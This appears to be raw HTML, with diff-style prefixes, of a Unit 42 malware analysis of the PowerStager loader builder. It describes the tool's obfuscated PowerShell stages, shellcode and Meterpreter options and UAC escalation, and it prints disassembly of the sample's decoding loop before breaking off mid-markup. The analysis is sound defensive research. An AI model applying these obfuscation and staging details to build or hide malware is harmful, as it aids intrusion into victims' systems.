+<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
+<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
+<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
+<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
+<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
+<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
+<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
+<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
+<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
+<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
+<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
+<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
+<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
+<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
+<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
+<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
+<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
+</svg>
+
+</a>
+
+      </div>
+
+      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
+        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
+      </div>
+
+      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
+        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
+      </div>
+
+      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
+        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
+                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
+                  </div>
+      </div>
+
+      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
+        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
+  <div class="container px-sm-30">
+    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
+<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
+<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
+<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
+</ul>  </div>
+</nav>
+
+  <article class="article overflow-hidden">
+    
+<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
+  <div class="container">
+    
+    <h1 class="article__header__title mb-sm-30 mb-40">PowerStager Analysis</h1>
+
+    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
+      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-56811 entry-meta">
+			
+			
+			<span class="post-views-count">22,723</span>
+			</div> <span class="ml-5">people reacted</span></li>
+      <li class="d-sm-none col-12 p-0"></li>
+      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'56811','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
+      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 8</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
+    </ul>
+
+    <div class="article__share position-relative">
+      <div class="dropdown dropdown-right">
+        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
+        </button>
+        <div class="dropdown-menu rounded-pill" role="toolbar">
+          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
+            <div class="row align-items-center flex-nowrap">
+              <div class="col">
+                <div class="d-flex align-items-center">
+                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-powerstager-analysis%2F" target="_blank"><i class="ui ui-7"></i></a>
+                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-powerstager-analysis%2F+-+PowerStager+Analysis" target="_blank"><i class="ui ui-8"></i></a>
+                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-powerstager-analysis%2F&title=PowerStager+Analysis&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
+                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-powerstager-analysis/" target="_blank"><i class="ui ui-10"></i></a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
+  <div class="container">
+    <div class="row align-items-center no-gutters">
+      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
+        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
+      </div>
+  
+      <div class="col-sm col-12">
+        <p>
+          By <a href="https://unit42.paloaltonetworks.com/author/jeff-white/" title="Posts by Jeff White" class="author url fn" rel="author">Jeff White</a>        </p>
+        <p><time datetime="2018-01-12T13:00:30+00:00">January 12, 2018 at 5:00 AM</time></p>
+        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
+        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/powershell/" rel="tag">Powershell</a>, <a href="https://unit42.paloaltonetworks.com/tag/powerstager/" rel="tag">PowerStager</a></p>
+      </div>
+    </div>
+  </div>
+</div>    <div class="py-30 bg-white">
+      <div class="container">
+        <div class="article__content pb-30">
+                      <figure class="mb-30 text-center">
+              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
+                    <p><span style="font-size: 18pt;">Introduction</span><br />
+In this blog post I’m going to be taking a look at a tool called <a href="https://github.com/z0noxz/powerstager">PowerStager</a>, which has been flying under the radar since April of 2017. The main reason it caught my attention was due to a fairly unique obfuscation technique it was employing for its PowerShell segments which I haven’t seen utilized in other tools yet. When tracking this technique, I saw an uptick in usage of PowerStager for in-the-wild attacks around December 2017.<br />
+I’ll cover how the tool works briefly and then touch on some of the attacks and artifacts that can be observed.<br />
+<span style="font-size: 18pt;">PowerStager Overview</span><br />
+At its core, PowerStager is a Python script that generates Windows executables using C source code and then, utilizing multiple layers of obfuscation, launches PowerShell scripts with the end goal of executing a shellcode payload. There are quite a few configuration options for PowerStager which gives it a fair amount of flexibility. Below are a some of the listed configuration options from the code:</p>
+<ul>
+<li>Ability to choose target platform (x86 or x64)</li>
+<li>Ability to use additional obfuscation on top of defaults</li>
+<li>Ability to display customized error messages/executable icon for social engineering</li>
+<li>Ability to utilize Meterpreter or other built-in shellcode payloads</li>
+<li>Ability to fetch remote payloads or embed them into the executable</li>
+<li>Ability to escalate privileges using UAC</li>
+</ul>
+<p>For the samples I’ll be covering, the general flow is laid out in the following image.<br />
+&nbsp;<br />
+&nbsp;<br />
+<img class="aligncenter wp-image-56898" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/Picture1.png" alt="Picture1" width="600" height="859" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/Picture1.png 808w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/Picture1-210x300.png 210w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/Picture1-768x1100.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/Picture1-715x1024.png 715w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/Picture1-370x530.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
+<p style="text-align: center;"><em>Figure 1. PowerStager Execution Flow</em></p>
+<p>I’ll cover each piece before diving into the bulk analysis of all samples observed thus far.<br />
+<span style="font-size: 18pt;"><br />
+PE Analysis</span><br />
+It should be noted that most of this analysis was prior to actually finding the source code. After looking at numerous samples, it was clear that they were being generated programmatically and so I set out to try and identify the source.<br />
+Within each of the executables was an embedded string for the file that gets created.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7da232838954" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+004015BC   |.  C74424 08 05F04&gt;MOV DWORD PTR SS:[ESP+8],75809731.0040&gt;;  ASCII "%s\\A62q1gMHhRWy"</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7da232838954-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7da232838954-1"><span class="crayon-cn">004015BC</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">C74424</span><span class="crayon-h"> </span><span class="crayon-cn">08</span><span class="crayon-h"> </span><span class="crayon-cn">05F04</span><span class="crayon-o">&gt;</span><span class="crayon-e">MOV </span><span class="crayon-e">DWORD </span><span class="crayon-e">PTR </span><span class="crayon-v">SS</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-v">ESP</span><span class="crayon-o">+</span><span class="crayon-cn">8</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-cn">75809731.0040</span><span class="crayon-o">&gt;</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">ASCII</span><span class="crayon-h"> </span><span class="crayon-s">"%s\\A62q1gMHhRWy"</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0003 seconds] -->
+<p>The file name is randomized between samples which was a major clue that there was a builder. This value is again referenced later on deep within multiple layers of PowerShell scripts and gave further credence to this theory, as typically these random file names are generated on the fly and not embedded within.<br />
+The initial executable created by PowerStager is pretty straight forward. It gets the %TMP% environment path and creates the file with the embedded file name. Afterwards it performs two memcpy() calls for data found within the .data section of the executable and moves them into a new memory page. For the sample looked at in this analysis, the first memcpy() grabs data from offset 0x20 in the .data section, whereas the second memcpy() grabs the same size of data from offset 0x67E0. Finally, it runs a decoding function on it before finally saving it to the file.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7e1479423373" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+0040164E   |&gt; /8D95 D8C6FFFF   /LEA EDX,[LOCAL.3658]
+00401654   |. |8B45 F4         |MOV EAX,[LOCAL.3]
+00401657   |. |01D0            |ADD EAX,EDX                                 ;  75809731.004067E0
+00401659   |. |0FB618          |MOVZX EBX,BYTE PTR DS:[EAX]
+0040165C   |. |8B4D F4         |MOV ECX,[LOCAL.3]
+0040165F   |. |89C8            |MOV EAX,ECX
+00401661   |. |C1E8 06         |SHR EAX,6
+00401664   |. |BA 9D889704     |MOV EDX,497889D
+00401669   |. |F7E2            |MUL EDX                                     ;  75809731.004067E0
+0040166B   |. |89D0            |MOV EAX,EDX                                 ;  75809731.004067E0
+0040166D   |. |C1E8 02         |SHR EAX,2
+00401670   |. |69C0 C0370000   |IMUL EAX,EAX,37C0
+00401676   |. |29C1            |SUB ECX,EAX
+00401678   |. |89C8            |MOV EAX,ECX
+0040167A   |. |0FB68405 188FFF&gt;|MOVZX EAX,BYTE PTR SS:[EBP+EAX+FFFF8F18]
+00401682   |. |31C3            |XOR EBX,EAX
+00401684   |. |89D9            |MOV ECX,EBX
+00401686   |. |8D95 D8C6FFFF   |LEA EDX,[LOCAL.3658]
+0040168C   |. |8B45 F4         |MOV EAX,[LOCAL.3]
+0040168F   |. |01D0            |ADD EAX,EDX                                 ;  75809731.004067E0
+00401691   |. |8808            |MOV BYTE PTR DS:[EAX],CL
+00401693   |. |8345 F4 01      |ADD [LOCAL.3],1
+00401697   |&gt; |8B45 F4          MOV EAX,[LOCAL.3]                           ; ||||
+0040169A   |. |3D BF370000     |CMP EAX,37BF                                ; ||||
+0040169F   |.^\76 AD           \JBE SHORT 75809731.0040164E                 ; ||||</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-2">2</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-4">4</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-6">6</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-8">8</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-10">10</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-12">12</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-14">14</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-16">16</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-18">18</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-20">20</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-22">22</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694cd07d7e1479423373-24">24</div><div class="crayon-num" data-line="crayon-5f694cd07d7e1479423373-25">25</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-1"><span class="crayon-cn">0040164E</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-cn">8D95</span><span class="crayon-h"> </span><span class="crayon-v">D8C6FFFF</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">/</span><span class="crayon-e">LEA </span><span class="crayon-v">EDX</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3658</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-2"><span class="crayon-cn">00401654</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8B45</span><span class="crayon-h"> </span><span class="crayon-v">F4</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-3"><span class="crayon-cn">00401657</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">01D0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">ADD </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-i">EDX</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">75809731.004067E0</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-4"><span class="crayon-cn">00401659</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">0FB618</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MOVZX </span><span class="crayon-v">EBX</span><span class="crayon-sy">,</span><span class="crayon-t">BYTE</span><span class="crayon-h"> </span><span class="crayon-e">PTR </span><span class="crayon-v">DS</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-v">EAX</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-5"><span class="crayon-cn">0040165C</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8B4D</span><span class="crayon-h"> </span><span class="crayon-v">F4</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">ECX</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-6"><span class="crayon-cn">0040165F</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">89C8</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-i">ECX</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-7"><span class="crayon-cn">00401661</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-i">C1E8</span><span class="crayon-h"> </span><span class="crayon-cn">06</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">SHR </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-cn">6</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-8"><span class="crayon-cn">00401664</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-i">BA</span><span class="crayon-h"> </span><span class="crayon-cn">9D889704</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">EDX</span><span class="crayon-sy">,</span><span class="crayon-cn">497889D</span></div><div class="crayon-line" 